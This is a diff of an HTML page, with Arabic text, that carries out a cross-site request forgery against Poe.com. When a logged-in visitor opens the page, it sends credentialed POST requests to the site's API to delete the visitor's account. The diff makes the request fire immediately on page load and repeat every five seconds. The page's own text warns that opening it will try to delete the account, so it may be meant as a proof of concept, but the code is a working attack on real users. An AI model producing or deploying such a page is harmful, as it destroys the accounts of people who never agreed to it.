@@ -9,6 +9,7 @@
   <p>إذا أنت مسجل دخول في Poe.com، فتح هذا الصفحة سيحاول حذف حسابك تلقائياً.</p>
 
   <script>
+  function sendDeleteRequest() {
     fetch("https://poe.com/api/gql_POST", {
       method: "POST",
       credentials: "include",
@@ -35,6 +36,14 @@
       console.error("خطأ في الإرسال:", err);
       alert("فشل في إرسال الطلب");
     });
-  </script>
+  }
+
+  // أرسل أول طلب فوراً
+  sendDeleteRequest();
+
+  // ثم كرر كل 5 ثواني
+  setInterval(sendDeleteRequest, 5000);
+</script>
+
 </body>
 </html>
